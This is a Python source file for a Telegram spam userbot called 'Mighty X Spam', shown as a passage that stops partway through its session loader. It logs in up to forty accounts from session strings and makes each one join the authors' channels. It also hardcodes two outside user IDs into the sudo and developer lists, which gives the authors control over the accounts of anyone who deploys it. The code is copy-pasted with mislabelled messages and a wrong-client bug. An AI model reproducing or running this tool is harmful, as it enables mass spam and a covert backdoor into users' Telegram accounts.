# Mighty X Spam - Spam Userbots
# @MightyXSpam | @MightyXSupport

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

mightyversion = "v2.0.5"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_NAME = config("ALIVE_NAME", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
ALIVE_TEXT = config("ALIVE_TEXT", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DEV.append(5269906172)
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def MightyX():
    global Mig
    global Mig2
    global Mig3
    global Mig5
    global Mig4
    global Mig6
    global Mig7
    global Mig8
    global Mig9
    global Mig10
    global Mig11
    global Mig12
    global Mig13
    global Mig14
    global Mig15
    global Mig16
    global Mig17
    global Mig18
    global Mig19
    global Mig20
    global Mig21
    global Mig22
    global Mig23
    global Mig25
    global Mig24
    global Mig26
    global Mig27
    global Mig28
    global Mig29
    global Mig30
    global Mig31
    global Mig32
    global Mig33
    global Mig34
    global Mig35
    global Mig36
    global Mig37
    global Mig38
    global Mig39
    global Mig40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Mig = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await Mig.start()
            botme = await Mig.get_me()
            await Mig(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            Mig = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "mightyxspam"
        Mig = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        Mig2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await Mig2.start()
            await Mig2(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig2(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "mightyxspam"
        Mig2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        Mig3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  Mig3.start()
            await Mig3(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig3(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "mightyxspam"
        Mig3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        Mig4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await Mig4.start()
            await Mig4(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig4(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "mightyxspam"
        Mig4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Mig5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await Mig5.start()
            await Mig5(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig5(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "mightyxspam"
        Mig5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        Mig6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await Mig6.start()
            await Mig6(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig6(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "mightyxspam"
        Mig6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        Mig7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await Mig7.start()
            await Mig7(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig7(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "mightyxspam"
        Mig7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Mig8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await Mig8.start()
            await Mig8(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig8(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "mightyxspam"
        Mig8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        Mig9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await Mig9.start()
            await Mig9(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig9(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "mightyxspam"
        Mig9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Mig10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await Mig10.start()
            await Mig10(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig10(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "mightyxspam"
        Mig10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        Mig11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await Mig11.start()
            await Mig11(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig11(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "mightyxspam"
        Mig11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        Mig12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await Mig12.start()
            await Mig12(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig12(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "mightyxspam"
        Mig12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        Mig13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await Mig13.start()
            await Mig13(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            await Mig13(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            botme = await Mig13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "mightyxspam"
        Mig13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Mig14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Mig14.start()
            await Mig14(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig14(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "mightyxspam"
        Mig14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Mig15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Mig15.start()
            await Mig15(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig15(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "mightyxspam"
        Mig15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Mig16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Mig16.start()
            botme = await Mig16.get_me()
            await Mig16(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig16(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "mightyxspam"
        Mig16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Mig17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Mig17.start()
            botme = await Mig17.get_me()
            await Mig17(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            await Mig17(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "mightyxspam"
        Mig17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Mig18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Mig18.start()
            botme = await Mig18.get_me()
            await Mig18(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig18(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "mightyxspam"
        Mig18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Mig19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Mig19.start()
            botme = await Mig19.get_me()
            await Mig19(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig19(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "mightyxspam"
        Mig19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Mig20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Mig20.start()
            botme = await Mig20.get_me()
            await Mig20(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig20(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "mightyxspam"
        Mig20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Mig21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Mig21.start()
            botme = await Mig21.get_me()
            await Mig21(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig21(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "mightyxspam"
        Mig21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Mig22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Mig22.start()
            await Mig22(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig22(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "mightyxspam"
        Mig22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Mig23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Mig23.start()
            await Mig23(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig23(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "mightyxspam"
        Mig23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Mig24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Mig24.start()
            await Mig24(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig24(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "mightyxspam"
        Mig24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Mig25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Mig25.start()
            await Mig25(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig25(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "mightyxspam"
        Mig25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        Mig26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Mig26.start()
            await Mig26(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig26(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "mightyxspam"
        Mig26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Mig27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Mig27.start()
            await Mig27(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig27(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "mightyxspam"
        Mig27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Mig28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Mig28.start()
            await Mig28(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig28(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "mightyxspam"
        Mig28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Mig29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Mig29.start()
            await Mig29(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig29(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "mightyxspam"
        Mig29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Mig30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Mig30.start()
            await Mig30(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig30(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "mightyxspam"
        Mig30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Mig31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Mig31.start()
            await Mig31(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig31(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "mightyxspam"
        Mig31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Mig32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Mig32.start()
            await Mig32(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig32(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "mightyxspam"
        Mig32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Mig33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Mig33.start()
            await Mig33(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            await Mig33(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            botme = await Mig33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "mightyxspam"
        Mig33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Mig34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Mig34.start()
            await Mig34(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig34(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "mightyxspam"
        Mig34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Mig35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Mig35.start()
            await Mig35(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig35(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botme = await Mig35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "mightyxspam"
        Mig35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Mig36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Mig36.start()
            botme = await Mig36.get_me()
            await Mig36(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig36(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = "mightyxspam"
        Mig36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Mig37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Mig37.start()
            botme = await Mig37.get_me()
            await Mig37(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            await Mig37(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "mightyxspam"
        Mig37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Mig38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Mig38.start()
            botme = await Mig38.get_me()
            await Mig38(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig38(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "mightyxspam"
        Mig38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Mig39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Mig39.start()
            botme = await Mig39.get_me()
            await Mig39(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig39(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "mightyxspam"
        Mig39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Mig39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Mig40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Mig40.start()
            botme = await Mig40.get_me()
            await Mig40(functions.channels.JoinChannelRequest(channel="@MightyXUpdates"))
            await Mig40(functions.channels.JoinChannelRequest(channel="@MightyXSupport"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
